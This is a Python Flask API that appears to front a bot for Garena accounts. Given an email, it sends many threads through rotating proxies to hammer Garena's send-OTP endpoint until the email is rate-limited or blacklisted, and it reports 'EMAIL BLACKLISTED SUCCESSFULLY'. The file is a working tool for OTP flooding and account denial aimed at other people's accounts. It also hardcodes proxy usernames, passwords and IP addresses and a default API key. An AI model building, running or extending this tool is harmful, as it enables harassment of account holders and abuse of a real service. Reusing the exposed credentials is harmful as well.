import os
import json
import time
import asyncio
from datetime import datetime
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS

import main as bot

app = Flask(__name__)
CORS(app)

# ==================== CONFIG ====================
API_KEY = os.environ.get("API_KEY", "CHANGE_THIS_SECRET_KEY_123")
PORT = int(os.environ.get("PORT", 5000))

# ==================== PROXY LIST (Aapki 10 Proxies) ====================
PROXY_USER = "wxluhxnj"
PROXY_PASS = "rjkn6i3x9t0g"

PROXY_LIST = [
    "45.38.107.97:6014",
    "64.137.96.74:6641",
    "198.23.243.226:6361",
    "38.154.185.97:6370",
    "84.247.60.125:6095",
    "191.96.254.138:6185",
    "198.46.161.42:5092",
    "64.137.10.153:5803",
    "104.164.49.38:7693",
    "23.26.71.145:5628",
]

PROXIES = [f"http://{PROXY_USER}:{PROXY_PASS}@{p}" for p in PROXY_LIST]

_proxy_index = 0
_proxy_lock = bot.threading.Lock()

def get_next_proxy():
    global _proxy_index
    with _proxy_lock:
        p = PROXIES[_proxy_index % len(PROXIES)]
        _proxy_index += 1
        return p

# ==================== AUTH ====================
def require_api_key(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get("X-API-Key") or request.args.get("api_key")
        if key != API_KEY:
            return jsonify({"success": False, "error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# ==================== PROXY WORKER ====================
def worker_with_proxy(email, gen):
    while not bot.stop_event.is_set():
        if gen != bot.generation: return
        url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {"app_id": "100067", "email": email, "locale": "hi_IN"}

        for i in range(bot.OTP_PER_WORKER):
            if bot.stop_event.is_set() or gen != bot.generation:
                return

            proxy = get_next_proxy()
            proxies_dict = {"http": proxy, "https": proxy}

            try:
                resp = bot.requests.post(
                    url, headers=headers, data=data,
                    timeout=25, proxies=proxies_dict, verify=False
                )
                try: j = resp.json()
                except Exception: j = {}

                err, code, result = j.get("error"), j.get("code"), j.get("result")
                msg = None
                if err == "error_no_binding_found": msg = "no_binding"
                elif err == "error_too_many_requests" or code == 1006: msg = "already_blacklisted"
                elif err == "error_params": msg = "wrong_email"
                elif result == 0: msg = "success"
                elif resp.status_code == 403:
                    time.sleep(1); continue

                if msg is not None:
                    with bot.error_print_lock:
                        if not bot.error_event.is_set():
                            bot.error_event.set()
                            bot.result_message = msg
                            if msg == "success":
                                with bot.any_success_lock:
                                    bot.any_success = True
                            bot.stop_event.set()
                    return
            except Exception:
                time.sleep(0.5); continue
            time.sleep(0.5)

def blacklist_email_proxy(email, is_auto=False):
    bot.generation += 1
    bot.any_success = False
    bot.result_message = None
    bot.error_event.clear()
    bot.stop_event.clear()

    workers_count = bot.NUM_WORKERS_AUTO if is_auto else bot.NUM_WORKERS_MANUAL
    threads = []
    for _ in range(workers_count):
        t = bot.threading.Thread(target=worker_with_proxy, args=(email, bot.generation))
        t.daemon = True; t.start(); threads.append(t)

    bot.stop_event.wait(timeout=bot.WORKER_TIMEOUT)
    bot.stop_event.set()
    for t in threads: t.join(timeout=2)

    if bot.result_message == "success": return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
    elif bot.result_message == "already_blacklisted": return False, "🔴 EMAIL ALREADY BLACKLISTED"
    elif bot.result_message == "no_binding": return False, "⚠️ Not bound to any account."
    elif bot.result_message == "wrong_email": return False, "❌ Invalid Email address."
    else: return False, "⚠️ TIMEOUT / API FAILED."

# ==================== ROUTES ====================
@app.route("/", methods=["GET"])
def root():
    return jsonify({
        "success": True,
        "service": "Blacklist API (10 Proxies)",
        "total_proxies": len(PROXIES),
        "proxies": PROXY_LIST,
        "status": "online",
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "success": True,
        "status": "healthy",
        "total_proxies": len(PROXIES),
        "auto_emails": len(bot.auto_emails_list),
        "users": len(bot.users_list)
    })

@app.route("/api/blacklist", methods=["POST"])
@require_api_key
def api_blacklist():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip()
    if not email:
        return jsonify({"success": False, "error": "email required"}), 400
    if not bot.is_valid_email(email):
        return jsonify({"success": False, "error": "Invalid email", "email": email}), 400
    try:
        success, result = blacklist_email_proxy(email, is_auto=False)
    except Exception as e:
        return jsonify({"success": False, "error": str(e), "email": email}), 500
    return jsonify({
        "success": bool(success),
        "email": email,
        "message": result,
        "proxies_available": len(PROXIES),
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })

# ==================== RUN ====================
if __name__ == "__main__":
    print(f"[+] Proxy API on port {PORT}")
    print(f"[+] {len(PROXIES)} proxies loaded")
    app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)